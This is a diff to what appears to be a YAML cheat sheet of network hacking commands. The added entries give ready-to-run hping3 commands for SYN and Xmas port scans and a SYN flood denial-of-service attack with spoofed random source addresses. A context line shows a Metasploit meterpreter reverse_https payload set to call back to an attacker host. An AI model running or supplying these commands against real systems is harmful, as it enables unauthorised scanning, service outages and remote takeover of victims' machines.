@@ -585,3 +585,43 @@
     - set PAYLOAD windows/meterpreter/reverse_https
     - set LHOST 192.168.1.4
     - set LPORT 8080
+
+- title: SYN scan with Hping
+  category: NetworkHacking
+  description: Scans a target and returns its open ports
+  content: >-
+    We can perform an active scan using hping on a target to get its opened
+    ports and the name of the service they are running.
+
+    Running this command will perform a scan between min_port and max_port on
+    [target ip/domain].
+
+    The `-S` flag is used to perform a scan using the SYN flag.
+  commands:
+    - hping3 --scan [min_port]-[max_port] -S [target ip/domain]
+  example:
+    - hping3 --scan 0-500 -S 192.168.1.8
+
+- title: Xmas scan with Hping
+  category: NetworkHacking
+  description: Scans a target and returns its open ports
+  content: >-
+    Perform a Xman scan on a target.
+  commands:
+    - hping3 --scan [min_port]-[max_port] -X [target ip/domain]
+  example:
+    - hping3 --scan 0-500 -X 192.168.1.8
+
+- title: DoS attack with Hping
+  category: NetworkHacking
+  description: Performs a DoS attack using Hping
+  content: >-
+    Performs a DoS attack.
+
+    The `--flood` flag sends packets as fast as possible, the `-S` flag means to
+    send the packets using the SYN flag, `-V` means verbose and `--rand-source`
+    will randomise the source IP addresses.
+  commands:
+    - hping3 --flood -S -V --rand-source [target ip/domain]
+  example:
+    - hping3 --flood -S -V --rand-source 192.168.1.8
